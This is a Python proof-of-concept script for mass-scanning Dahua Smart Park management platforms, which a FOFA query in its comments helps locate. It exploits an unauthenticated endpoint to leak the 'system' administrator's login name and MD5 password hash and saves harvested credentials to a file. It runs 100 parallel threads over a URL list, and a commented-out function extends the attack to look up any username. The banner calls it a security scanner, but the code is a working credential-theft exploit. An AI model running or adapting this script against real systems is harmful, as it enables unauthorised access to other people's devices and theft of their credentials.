import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#fofa：body="/WPMS/asset/lib/gridster/"
def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 大华智慧园区管理平台安全漏洞扫描工                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
                             
"""
    print(test)
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
def poc(target):
    url = target+"/admin/user_getUserInfoByUserName.action?userName=system"
    try:
        res = requests.get(url,headers=headers,timeout=5,verify=False).text
        result2 = re.findall('''"loginName":"(.*?)"''', res, re.S)[0]
        result3 = re.findall('''"loginPass":"(.*?)"''', res, re.S)[0]
        if '"loginName":"system"' in res:
            print(f"[+] {target} is vulable")
            with open("request.txt", "a+", encoding="utf-8") as f:
                f.write(target+" 用户名："+result2+" 密码（md5加密）："+result3+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False


def main():
    banner()
    parser = argparse.ArgumentParser(description='SMART-PARK ReadPasswd POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()



# def exp(target):
# #     print("等待连接...")
# #     time.sleep(2)
# #     os.system("cls")
# #     while True:
# #         cmd = input("请输入用户名(管理员用户名:system,q--->quit)\n>>>")
# #         if cmd == "q":
# #             exit()
# #         url = target+f"/admin/user_getUserInfoByUserName.action?userName={cmd}"
# #         try:
# #             rep = requests.get(url,headers=headers,verify=False,timeout=5).text
# #             result1 = re.findall('''{(.*?)}''', rep, re.S)[0]
# #             result2 = re.findall('''"loginName":"(.*?)"''', rep, re.S)[0]
# #             result3 = re.findall('''"loginPass":"(.*?)"''', rep, re.S)[0]
# #             print(result1)
# #             with open("url_username_passwd.txt", "a+", encoding="utf-8") as f:
# #                 f.write(target+" 用户名："+result2+" 密码（md5加密）："+result3+"\n")
# #         except:
# #             print("执行异常,请重新执行其它命令")
